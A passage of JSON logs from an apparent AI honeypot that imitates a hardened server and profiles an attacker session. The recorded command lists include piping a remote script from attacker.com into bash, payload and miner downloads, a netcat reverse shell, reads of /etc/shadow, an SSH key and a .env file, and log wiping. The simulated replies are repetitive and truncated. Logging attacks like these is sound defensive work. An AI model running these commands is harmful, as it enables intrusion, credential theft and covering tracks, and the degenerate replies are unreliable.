            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec --version",
            "dirtycow",
            "sudo -l",
            "chmod +x payload.sh",
            "chmod 777 /var/www/html/uploads",
            "nc -lvp 4444",
            "netcat -e /bin/bash 10.0.0.5 8080",
            "telnet 10.0.0.1 23",
            "ssh user@10.0.0.1",
            "ftp 10.0.0.1"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:19:03,354 - {"session_id": "71dd20b2", "command": "ftp 10.0.0.1", "attack_type": "Unknown", "risk_score": 136, "threat_level": "CRITICAL"}
2026-07-21 11:19:03,354 - {
    "session_id": "71dd20b2",
    "command": "ftp 10.0.0.1",
    "ai_decision": "ftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp:",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 66
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 136,
    "threat_level": "CRITICAL"
}
2026-07-21 11:19:03,355 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: ftp 10.0.0.1",
    "ai_decision": "ftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp: connect: Connection refused\nftp:",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:19:03,442 - {
    "session_id": "71dd20b2",
    "query": "history -c",
    "response": "None",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 137,
        "risk_level": "CRITICAL",
        "final_score": 137,
        "threat_level": "CRITICAL",
        "base_score": 137,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 67,
            "unique_commands": 64,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 759,
            "commands_executed": 67,
            "successful_commands": 58,
            "failed_commands": 9,
            "files_accessed": 8,
            "services_accessed": 1,
            "engagement_score": 88,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 137,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec --version",
            "dirtycow",
            "sudo -l",
            "chmod +x payload.sh",
            "chmod 777 /var/www/html/uploads",
            "nc -lvp 4444",
            "netcat -e /bin/bash 10.0.0.5 8080",
            "telnet 10.0.0.1 23",
            "ssh user@10.0.0.1",
            "ftp 10.0.0.1",
            "history -c"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:19:03,444 - {"session_id": "71dd20b2", "command": "history -c", "attack_type": "Unknown", "risk_score": 137, "threat_level": "CRITICAL"}
2026-07-21 11:19:03,444 - {
    "session_id": "71dd20b2",
    "command": "history -c",
    "ai_decision": "None",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 67
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 137,
    "threat_level": "CRITICAL"
}
2026-07-21 11:19:03,444 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: history -c",
    "ai_decision": "None",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:19:27,742 - {
    "session_id": "71dd20b2",
    "query": "rm -rf /var/log/nginx",
    "response": "[Guardrail] Dangerous command detected. Response blocked.",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 157,
        "risk_level": "CRITICAL",
        "final_score": 157,
        "threat_level": "CRITICAL",
        "base_score": 157,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 68,
            "unique_commands": 65,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 760,
            "commands_executed": 68,
            "successful_commands": 58,
            "failed_commands": 10,
            "files_accessed": 8,
            "services_accessed": 1,
            "engagement_score": 88,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 157,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec --version",
            "dirtycow",
            "sudo -l",
            "chmod +x payload.sh",
            "chmod 777 /var/www/html/uploads",
            "nc -lvp 4444",
            "netcat -e /bin/bash 10.0.0.5 8080",
            "telnet 10.0.0.1 23",
            "ssh user@10.0.0.1",
            "ftp 10.0.0.1",
            "history -c",
            "rm -rf /var/log/nginx"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:19:27,742 - {"session_id": "71dd20b2", "command": "rm -rf /var/log/nginx", "attack_type": "System Destruction Attempt", "risk_score": 157, "threat_level": "CRITICAL"}
2026-07-21 11:19:27,742 - {
    "session_id": "71dd20b2",
    "command": "rm -rf /var/log/nginx",
    "ai_decision": "[Guardrail] Dangerous command detected. Response blocked.",
    "confidence_score": 0.95,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 68
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.95
    },
    "risk_score": 157,
    "threat_level": "CRITICAL"
}
2026-07-21 11:19:27,742 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: rm -rf /var/log/nginx",
    "ai_decision": "[Guardrail] Dangerous command detected. Response blocked.",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "System Destruction Attempt",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:19:51,161 - {
    "session_id": "71dd20b2",
    "query": "stop auditd",
    "response": "[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n/sbin/service auditd stop\nStopping auditd: [  OK  ]\nauditd stopped\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 158,
        "risk_level": "CRITICAL",
        "final_score": 158,
        "threat_level": "CRITICAL",
        "base_score": 158,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 69,
            "unique_commands": 66,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 784,
            "commands_executed": 69,
            "successful_commands": 59,
            "failed_commands": 10,
            "files_accessed": 8,
            "services_accessed": 1,
            "engagement_score": 88,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 158,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org",
            "minerd --url pool",
            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec --version",
            "dirtycow",
            "sudo -l",
            "chmod +x payload.sh",
            "chmod 777 /var/www/html/uploads",
            "nc -lvp 4444",
            "netcat -e /bin/bash 10.0.0.5 8080",
            "telnet 10.0.0.1 23",
            "ssh user@10.0.0.1",
            "ftp 10.0.0.1",
            "history -c",
            "rm -rf /var/log/nginx",
            "stop auditd"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:19:51,161 - {"session_id": "71dd20b2", "command": "stop auditd", "attack_type": "Unknown", "risk_score": 158, "threat_level": "CRITICAL"}
2026-07-21 11:19:51,161 - {
    "session_id": "71dd20b2",
    "command": "stop auditd",
    "ai_decision": "[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n/sbin/service auditd stop\nStopping auditd: [  OK  ]\nauditd stopped\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 69
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 158,
    "threat_level": "CRITICAL"
}
2026-07-21 11:19:51,161 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: stop auditd",
    "ai_decision": "[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n/sbin/service auditd stop\nStopping auditd: [  OK  ]\nauditd stopped\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: root@prod-restricted-01: /home/ubuntu: stop auditd\n\n[Jun 22 14:30:00] AUDIT LOG: 